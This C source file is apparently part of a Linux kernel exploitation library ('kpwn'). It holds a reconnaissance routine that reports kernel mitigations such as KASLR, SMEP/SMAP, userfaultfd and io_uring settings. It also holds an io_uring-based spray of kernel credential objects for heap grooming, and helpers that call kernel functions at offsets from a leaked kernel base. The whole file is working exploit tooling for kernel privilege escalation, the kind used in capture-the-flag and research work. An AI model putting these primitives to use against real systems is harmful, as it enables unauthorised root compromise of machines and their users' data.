#define _GNU_SOURCE

#include <kpwn/kernel.h>
#include <kpwn/logger.h>
#include <kpwn/utils.h>
#include <stdarg.h>
#include <stdint.h>
#include <string.h>
#include <sys/syscall.h>
#include <unistd.h>

// io_uring constants (avoid dependency on <linux/io_uring.h>)
#ifndef SYS_io_uring_setup
#define SYS_io_uring_setup 425
#endif
#ifndef SYS_io_uring_register
#define SYS_io_uring_register 427
#endif
#ifndef IORING_REGISTER_PERSONALITY
#define IORING_REGISTER_PERSONALITY 9
#endif

struct io_uring_params {
  uint32_t sq_entries;
  uint32_t cq_entries;
  uint32_t flags;
  uint32_t sq_thread_cpu;
  uint32_t sq_thread_idle;
  uint32_t features;
  uint32_t wq_fd;
  uint32_t resv[3];
  struct {
    uint32_t head;
    uint32_t tail;
    uint32_t ring_mask;
    uint32_t ring_entries;
    uint32_t flags;
    uint32_t dropped;
    uint32_t array;
    uint32_t resv1;
    uint64_t resv2;
  } sq_off;
  struct {
    uint32_t head;
    uint32_t tail;
    uint32_t ring_mask;
    uint32_t ring_entries;
    uint32_t overflow;
    uint32_t cqes;
    uint32_t flags;
    uint32_t resv1;
    uint64_t resv2;
  } cq_off;
};

// capability constants (avoid dependency on <linux/capability.h>)
#ifndef _LINUX_CAPABILITY_VERSION_3
#define _LINUX_CAPABILITY_VERSION_3 0x20080522
#endif
#ifndef __NR_capget
#define __NR_capget SYS_capget
#endif
#ifndef __NR_capset
#define __NR_capset SYS_capset
#endif

struct __kpwn_cap_header {
  uint32_t version;
  int pid;
};
struct __kpwn_cap_data {
  uint32_t effective;
  uint32_t permitted;
  uint32_t inheritable;
};

// --- inspect / kchecksec -----------------------------------------------------

struct kchecksec_t inspect() {
  struct kchecksec_t check;
  memset(&check, 0, sizeof(check));

  check.uname = popen_read("uname -a", 4096);
  if (check.uname)
    trim_trailing_newlines(check.uname);

  check.cmdline = slurp_file("/proc/cmdline", 8192);
  if (check.cmdline)
    trim_trailing_newlines(check.cmdline);

  check.has_config_gz = file_is_readable("/proc/config.gz") ? 1 : 0;

  check.kptr_restrict = slurp_int_file("/proc/sys/kernel/kptr_restrict", -1);
  check.dmesg_restrict = slurp_int_file("/proc/sys/kernel/dmesg_restrict", -1);

  if (check.cmdline)
    check.kaslr_on = strstr(check.cmdline, "nokaslr") ? 0 : 1;
  else
    check.kaslr_on = -1;

  char *cpuinfo = slurp_file("/proc/cpuinfo", 1 << 16);
  check.cpu_smep = contains_token_case_insensitive(cpuinfo, "smep") ? 1 : 0;
  check.cpu_smap = contains_token_case_insensitive(cpuinfo, "smap") ? 1 : 0;
  free(cpuinfo);

  check.meltdown =
      slurp_file("/sys/devices/system/cpu/vulnerabilities/meltdown", 4096);
  if (check.meltdown)
    trim_trailing_newlines(check.meltdown);

  check.unpriv_userfaultfd =
      slurp_int_file("/proc/sys/vm/unprivileged_userfaultfd", -1);

  if (file_exists("/dev/userfaultfd")) {
    char *ls = popen_read("ls -l /dev/userfaultfd", 1024);
    if (ls) {
      char *first = read_first_n_lines(ls, 1);
      free(ls);
      check.dev_userfaultfd_ls =
          first ? first : str_dup_or_null("/dev/userfaultfd: (ls failed)");
      if (check.dev_userfaultfd_ls)
        trim_trailing_newlines(check.dev_userfaultfd_ls);
    } else {
      check.dev_userfaultfd_ls =
          str_dup_or_null("/dev/userfaultfd: (ls failed)");
    }
  } else {
    check.dev_userfaultfd_ls = str_dup_or_null("/dev/userfaultfd: none");
  }

  check.unpriv_bpf_disabled =
      slurp_int_file("/proc/sys/kernel/unprivileged_bpf_disabled", -1);
  check.bpf_jit_enable =
      slurp_int_file("/proc/sys/net/core/bpf_jit_enable", -1);
  check.io_uring_disabled =
      slurp_int_file("/proc/sys/kernel/io_uring_disabled", -1);

  int userns_clone =
      slurp_int_file("/proc/sys/kernel/unprivileged_userns_clone", -9999);
  if (userns_clone == -9999) {
    char *out = popen_read(
        "sysctl -n kernel.unprivileged_userns_clone 2>/dev/null", 256);
    if (out) {
      trim_trailing_newlines(out);
      char *end = NULL;
      long v = strtol(out, &end, 10);
      check.unpriv_userns_clone = (end != out) ? (int)v : -1;
      free(out);
    } else {
      check.unpriv_userns_clone = -1;
    }
  } else {
    check.unpriv_userns_clone = userns_clone;
  }

  check.seccomp_status = read_status_key_line("/proc/self/status", "Seccomp:");
  check.lsm = slurp_file("/sys/kernel/security/lsm", 4096);
  if (check.lsm)
    trim_trailing_newlines(check.lsm);

  if (command_exists("capsh")) {
    char *cap = popen_read("capsh --print", 1 << 16);
    if (cap) {
      char *first10 = read_first_n_lines(cap, 10);
      free(cap);
      if (first10) {
        trim_trailing_newlines(first10);
        check.capsh_first_lines = first10;
      }
    }
  }

  return check;
}

struct kchecksec_t kchecksec() {
  struct kchecksec_t check = inspect();

  log_info("[kchecksec] uname=%s", check.uname ? check.uname : "N/A");
  log_info("[kchecksec] cmdline=%s", check.cmdline ? check.cmdline : "N/A");
  log_info("[kchecksec] config.gz=%s", check.has_config_gz ? "yes" : "no");
  log_info("[kchecksec] kptr_restrict=%d dmesg_restrict=%d",
           check.kptr_restrict, check.dmesg_restrict);

  if (check.kaslr_on == 1)
    log_info("[kchecksec] KASLR=on");
  else if (check.kaslr_on == 0)
    log_info("[kchecksec] KASLR=off");
  else
    log_info("[kchecksec] KASLR=unknown");

  log_info("[kchecksec] SMEP=%d SMAP=%d", check.cpu_smep, check.cpu_smap);
  if (check.meltdown)
    log_info("[kchecksec] meltdown=%s", check.meltdown);

  log_info("[kchecksec] userfaultfd=%d bpf_disabled=%d bpf_jit=%d "
           "io_uring_disabled=%d userns_clone=%d",
           check.unpriv_userfaultfd, check.unpriv_bpf_disabled,
           check.bpf_jit_enable, check.io_uring_disabled,
           check.unpriv_userns_clone);

  if (check.seccomp_status)
    log_info("[kchecksec] %s", check.seccomp_status);
  log_info("[kchecksec] lsm=%s", check.lsm ? check.lsm : "N/A");
  if (check.capsh_first_lines)
    log_info("[kchecksec] capsh:\n%s", check.capsh_first_lines);

  return check;
}

// --- io_uring cred spray -----------------------------------------------------

static int uring_setup(unsigned entries, struct io_uring_params *p) {
  memset(p, 0, sizeof(*p));
  return (int)syscall(SYS_io_uring_setup, entries, p);
}

static int uring_register(int ring_fd, unsigned opcode, const void *arg,
                          unsigned nr_args) {
  return (int)syscall(SYS_io_uring_register, ring_fd, opcode, arg, nr_args);
}

int alloc_n_creds(int nr_creds) {
  ASSERT_MSG(nr_creds > 0, "nr_creds must be > 0");

  struct io_uring_params params;
  int ring_fd = SYSCHK(uring_setup(1, &params));

  struct __kpwn_cap_header cap_header = {
      .version = _LINUX_CAPABILITY_VERSION_3,
      .pid = 0,
  };
  struct __kpwn_cap_data cap_data[2];

  SYSCHK(syscall(__NR_capget, &cap_header, &cap_data));

  REP(nr_creds) {
    SYSCHK(syscall(__NR_capset, &cap_header, &cap_data));
    SYSCHK(uring_register(ring_fd, IORING_REGISTER_PERSONALITY, NULL, 0));
  }

  log_debug("[alloc_n_creds] sprayed %d creds", nr_creds);
  return ring_fd;
}

// --- kbase / kfunc -----------------------------------------------------------

void *kbase = NULL;

void set_kbase(void *addr) {
  log_success("[kpwn:kbase] kbase=%p", addr);
  kbase = addr;
}

static size_t call_ptr(void *fptr, int argc, va_list list) {
  size_t args[6];
  ASSERT_MSG(argc >= 0 && argc <= 6, "call_ptr: 0..6 args supported");
  for (int i = 0; i < argc; i++)
    args[i] = va_arg(list, size_t);

  switch (argc) {
  case 0:
    return ((size_t (*)())fptr)();
  case 1:
    return ((size_t (*)(size_t))fptr)(args[0]);
  case 2:
    return ((size_t (*)(size_t, size_t))fptr)(args[0], args[1]);
  case 3:
    return ((size_t (*)(size_t, size_t, size_t))fptr)(args[0], args[1],
                                                      args[2]);
  case 4:
    return ((size_t (*)(size_t, size_t, size_t, size_t))fptr)(args[0], args[1],
                                                              args[2], args[3]);
  case 5:
    return ((size_t (*)(size_t, size_t, size_t, size_t, size_t))fptr)(
        args[0], args[1], args[2], args[3], args[4]);
  case 6:
    return ((size_t (*)(size_t, size_t, size_t, size_t, size_t, size_t))fptr)(
        args[0], args[1], args[2], args[3], args[4], args[5]);
  default:
    __builtin_unreachable();
  }
}

size_t kfunc_abs(void *fptr, int argc, ...) {
  va_list list;
  va_start(list, argc);
  size_t ret = call_ptr(fptr, argc, list);
  va_end(list);
  return ret;
}

size_t kfunc_off(void *fptr, int argc, ...) {
  ASSERT_MSG(kbase != NULL, "kbase not set — call set_kbase() first");
  va_list list;
  va_start(list, argc);
  size_t ret = call_ptr((char *)kbase + (size_t)fptr, argc, list);
  va_end(list);
  return ret;
}
